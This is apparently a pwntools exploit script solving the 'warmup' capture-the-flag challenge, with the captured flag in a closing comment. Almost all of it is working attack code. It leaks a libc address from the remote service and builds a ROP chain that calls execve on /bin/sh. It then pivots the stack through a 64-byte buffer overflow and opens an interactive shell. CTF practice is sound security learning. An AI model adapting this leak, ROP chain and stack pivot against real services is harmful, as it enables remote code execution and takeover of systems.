#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template warmup --host 172.210.129.230 --port 1338
from pwn import *
from struct import pack
# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'warmup_patched')
context.terminal = "/home/royalgamer/.local/src/st/st"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '172.210.129.230'
port = int(args.PORT or 1338)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

putsadr = int((io.recvline().decode().strip("\n"))[2:],16)
okeyadr = 0x0401186
nameadr = 0x404060
retadr = 0x401140 
binsh= 0x001cb42f
system = 0x0582c0
p = lambda x : pack('Q', x)

IMAGE_BASE_0 = putsadr - 0x00087bd0 # be321b2e64c8cdfb59fd9cc2fb6c3945c604be767b45420eb05c038ead0d2bb7
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

# 0x00000000000288b5 : syscall
# 0x00000000000dd237 : pop rax ; ret
# 0x000000000010f75b : pop rdi ; ret
# 0x0000000000110a4d : pop rsi ; ret  isko mat use kar 0a ha
# 0x000000000002b46b : pop rsi ; pop rbp ; ret
# 0x00000000000b502c : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret

# rop = b''


rop = b''
rop += p64(IMAGE_BASE_0+0x000000000002b46b)
rop += p64(0)
rop += p64(0)
rop += p64(IMAGE_BASE_0+0x00000000000dd237)
rop += p64(0x3b)
rop += p64(IMAGE_BASE_0+0x000000000010f75b)
rop += p64(IMAGE_BASE_0+binsh)
rop += p64(IMAGE_BASE_0+0x00000000000288b5)
# "/bin/cat flag.txt\x00"
# rop += p64(IMAGE_BASE_0+0x000000000010f75b)
# rop += p64(IMAGE_BASE_0+binsh)
# # rop += p64(nameadr+32)
# rop += p64(IMAGE_BASE_0+system)

# rop += p64(retadr)
# rop += b"/bin/cat flag.txt\x00"
# rop += p64(IMAGE_BASE_0+binsh)


io.recvuntil(b"name>> ")
io.sendline(rop)
io.recvuntil(b"alright>> ")
payload = b"a"*64
payload += p64(nameadr) # Rbp We control RSP
payload += p64(okeyadr)
io.sendline(payload)

io.interactive()

# AKASEC{1_Me44444N_J00_C0ULDve_ju57_574CK_p1V07ed}